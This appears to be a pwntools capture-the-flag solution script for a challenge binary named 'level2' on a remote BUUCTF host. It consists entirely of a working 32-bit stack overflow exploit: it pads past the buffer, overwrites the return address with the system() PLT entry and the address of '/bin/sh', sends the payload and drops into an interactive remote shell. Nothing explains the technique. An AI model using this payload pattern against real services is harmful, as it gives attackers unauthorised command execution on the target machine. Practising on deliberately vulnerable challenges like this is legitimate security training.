from pwn import *


# p = process("./level2")
p = remote("node4.buuoj.cn", 27622)
pro = ELF("./level2")

system = pro.plt["system"]
binsh = next(pro.search(b"/bin/sh\x00"))

pad = cyclic(0x88+0x4)
pad += p32(system)+p32(0)+p32(binsh)
p.send(pad)

p.interactive()


